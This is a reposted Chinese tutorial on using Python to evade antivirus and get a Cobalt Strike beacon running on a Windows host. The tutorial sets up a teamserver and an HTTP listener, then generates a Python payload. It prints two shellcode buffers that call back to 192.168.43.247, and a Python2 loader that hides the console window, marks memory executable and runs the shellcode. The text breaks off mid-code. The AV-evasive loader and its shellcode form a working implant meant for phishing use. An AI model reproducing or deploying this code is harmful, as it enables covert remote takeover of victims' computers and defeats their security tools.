---
title: python免杀上线CS
url: https://buaq.net/go-143115.html
source: unSafe.sh - 不安全
date: 2022-12-30
fetch_date: 2025-10-04T02:42:57.554072
---

# python免杀上线CS

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/c02998314b82fdba31077f868ef593cb.jpg)

python免杀上线CS

作者：儒道易行CS的python免杀钓鱼文件源码：https://github.com/rdyx0/Anti-AntiVirus1.kali的ip为192.16
*2022-12-29 21:31:18
Author: [xz.aliyun.com(查看原文)](/jump-143115.htm)
阅读量:181
收藏*

---

作者：儒道易行

## CS的python免杀钓鱼

文件源码：<https://github.com/rdyx0/Anti-AntiVirus>

1.kali的ip为192.168.43.247

启动团队服务器（TeamServer），需要以root身份运行，并且需要添加两个必选参数。第 一个是团队服务器的外部可访问地址，第二个是用于团队成员将CobaltStrike客户端连接到

团队服务器的密码。本节示例IP为192.168.43.247，登录密码设置为admin

./teamserver 192.168.43.247 admin

如图所示

![](https://img-blog.csdnimg.cn/21b4177dd9094b84a060aff6c9e783e0.png)

2.连接团队服务器 在命令终端运行Cobalt Strike，填写IP地址为192.168.43.247，Cobalt Strike启动时的默认 端口为50050，昵称可以根据自己的喜好填写，这里写成admin，密码为服务端启动时设置 的密码admin，详细配置信息如图 点击Connect按钮后便成功登录团队服务器。如图所示为成功登录后的Cobalt Strike运行 界面。Cobalt Strike的主界面主要分为菜单栏、快捷功能区、目标列表区、控制台命令输 出区和控制台命令输入区。

![](https://img-blog.csdnimg.cn/ea23640923ff419fa4f0098ae2ed2906.png)

如果这是你第一次连接至此团队服务器， Cobalt Strike 会询问你是否承认这个团队服务器 的 SHA256 hash。如果你承认，那么按 OK ，然后 Cobalt Strike 的客户端就会连接到这 个团队服务器。Cobalt Strike 也会在未来的连接中记住这个 SHA256 hash。你可以通过 Cobalt Strike → Preferences → Fingerprints 来管理这些团队服务器的 hash。

![](https://img-blog.csdnimg.cn/ccaec3204c95495d919573569cb22663.png)

如图所示为成功登录后的Cobalt Strike运行界面。Cobalt Strike的主界面主要分为菜单 栏、快捷功能区、目标列表区、控制台命令输出区和控制台命令输入区。

![](https://img-blog.csdnimg.cn/301b6e19d6e349f6b8415e662bbd09a0.png)

∙菜单栏：集成了Cobalt Strike的所有功能。

∙快捷功能区：列出了常用功能。

∙目标列表区：根据不同的显示模式，显示已获取权限的主机及目标主机。

∙控制台命令输出区：输出命令执行结果。

∙控制台命令输入区：用户输入的命令。

3.建立Listener 现在可以利用Cobalt Strike获取一个Beacon。可以通过在菜单栏选择Cobalt Strike→Listeners命令进入Listeners面板，如图

![](https://img-blog.csdnimg.cn/7d1d91379ee64fd79715a1e837f9a3cf.png)

在Listeners面板中点击Add按钮，新建一个监听器，如图

![](https://img-blog.csdnimg.cn/421ee8ca631842e9b41003e76139a4b8.png)

在弹出的对话框中点击Save按钮后会弹出一个窗口，依次在窗口中输入名称、监听类型、 Cobalt Strike运行服务的IP地址、监听端口号。其中，监听器一共有9种类型，beacon系 列为Cobalt Strike自带类型，分别有DNS、HTTP、HTTPS、SMB、TCP。foreign系列用 于配合外部监听器，可使用其他主机远程控制Cobalt Strike中的主机，一般配合MSF使 用。这里选择监听器类型为HTTP方式，点击Save按钮进行保存，如图

![](https://img-blog.csdnimg.cn/d4478a61063e4785bc9a94b51d0b3ffe.png)

4.生成Payload 这里使用Pakages生成一个Payload。在菜单栏中依次选择Attacks→Pakages→Payload Generator命令，如图

![](https://img-blog.csdnimg.cn/b8d40c5440d7432fba2d5602dc0a0879.png)

保持默认配置，选择已经创建的监听器，设置输出类型为python，注意勾选x64，然后点击Launch按钮， 如图

![](https://img-blog.csdnimg.cn/e8619622b62b44bc9e3264fb0a40b4bc.png)

点击Launch按钮以后，会出现一段python类型的Payload代码，如下所示，将其保存到桌面，并复制下来

```
# length: 799 bytes
buf = "x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x29\x0d\x0a\x00\xcf\xdb\x00\xaa\xb0\x22\xd8\xbf\x41\x39\x75\x28\x7f\xdb\xa2\x1c\x0c\xcf\x54\x44\x37\xbd\x4f\x7e\xc6\xcf\x84\xb4\xab\xb2\x89\x4e\x8f\xda\x74\x2e\xbb\x70\xc1\xae\x1c\xba\x20\x68\xba\x61\x5f\x66\xf5\x52\x67\x44\xc9\xfc\x3a\xf4\x46\x19\x74\x67\x2c\x09\x99\x8d\x08\x58\x08\xf8\x8f\xe8\x62\x71\x20\xd6\xaa\x74\x38\x65\x4a\x51\x90\x89\xc8\x80\xe5\x7e\xda\xce\x8d\xbc\xf6\x89\x20\xc7\xf7\x36\xea\x49\xd8\xe8\x08\x69\x26\x35\xcd\x2a\xd7\x17\xb1\xbf\x00\x27\x86\x7d\x87\x34\xf0\xe9\x45\x05\x10\x4d\x27\x1d\xb3\x5d\x0b\x91\xcd\xa3\xb6\x89\x54\xee\x69\x35\xe7\x61\xb4\x26\x99\x9c\xac\xad\x61\xe2\xea\x49\xed\xcb\x15\xf2\x7d\x18\x3c\xab\x81\x0c\xf1\x1c\xde\x37\x29\x69\xe4\x3c\x48\x9e\x77\x62\x2f\xad\x7e\x9b\xb9\x73\xe5\x95\xd2\x95\xc0\x7b\x68\xf4\x17\x02\x6b\x28\x8c\x55\xd2\x4b\xc5\xe7\x80\xc9\x5d\x8f\x20\x61\xd3\x61\x90\x99\xe1\x9e\x86\x0e\xd0\x0c\xcb\x12\xaa\x31\xc0\x73\x31\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x34\x33\x2e\x32\x34\x37\x00\x51\x09\xbf\x6d"
```

编写python2脚本1：

```
from ctypes import *
import ctypes
# length: 891 bytes
buf = "x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x53\x4f\x7a\x41\x00\xfd\x77\x2a\xb4\x43\xb4\x12\x7b\xdc\x1d\x54\x43\xd1\xd4\xe3\x28\xc6\x83\x20\xe1\x0c\xbe\x02\xa4\xe0\xca\x85\x06\x01\x4a\x14\xcb\xd4\x91\xc1\xa6\x70\xf8\xc0\xb4\x5b\x86\x7f\x46\x9f\x2b\xc2\xc9\x2d\x19\x58\xc6\xce\x86\x24\xe9\xfe\x48\x3b\xcf\xcf\xac\xfe\xb3\xc4\x70\xfb\x61\x1b\x01\xc8\xb6\x7f\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x71\x64\x65\x73\x6b\x20\x32\x2e\x34\x2e\x31\x32\x36\x33\x2e\x32\x30\x33\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\xf1\x32\x9e\x7b\xe9\xc7\x75\xa7\x24\x8f\x5f\x0d\x3a\xde\x32\xde\x02\x1b\xe2\xb9\x4b\x25\x2b\x0e\x97\xf8\x04\xc7\x68\x05\x62\xf6\x93\x9c\xec\x5e\x49\x7c\xfa\x29\x29\x28\xc7\x26\xaf\x73\x26\xef\x04\x4d\x14\x09\x5c\x04\xec\x59\xee\x33\xf9\xca\xdc\x2d\x0c\x8c\x57\x53\x02\xc9\x09\x11\x86\x93\xa7\xa1\x9c\xb8\x28\xc2\x76\x6f\xdf\x38\x8d\x35\xec\xa7\x93\xf2\xba\x03\x75\x38\x90\x34\x84\x7e\xc1\x35\x18\x76\x70\xea\xac\xe2\x47\x1f\xb4\x4f\x8b\x33\x58\x72\xf6\x42\xf0\x3c\xbb\x74\x96\xd6\x57\x95\x0e\x98\x02\xda\xaf\x20\xaf\xc7\x0b\xf2\x8e\xc6\x6c\x9d\x42\x70\x4e\xaf\x09\xb0\x16\xf1\x6e\x93\x3b\xfb\x6c\x2f\x7f\xe3\x8b\xc5\x0c\xc4\x8f\xcb\xdd\x73\xfc\xb0\x04\x1d\x81\x17\x91\x49\x91\x17\xb3\xbc\x45\x2a\x65\xa0\x57\x72\x82\x85\xd6\x44\x18\x59\x11\x5e\x58\xbc\x92\xd1\x9a\x0e\x6e\x1f\x9a\xed\x1c\x51\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x34\x33\x2e\x32\x34\x37\x00\x51\x09\xbf\x6d"
#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
   buf = c_char_p(buffer)
   size = len(buffer)
   addr = libc.valloc(size)
   addr = c_void_p(addr)
   if 0 == addr:
       raise Exception("Failed to allocate memory")
   memmove(addr, buf, size)
   if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
       raise Exception("Failed to set protection on buffer")
   return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd != 0:
      if 666==666:
             ctypes.windll.user32.ShowWindow(whnd, 0)
             ctypes.windll.kernel32.CloseHandle(whnd)
print ".................................."*666
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                       ctypes.c_int(len(shellcode)),
                                         ctypes.c_int(0x3000),
                                         ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                    buf,
                                    ctypes.c_i...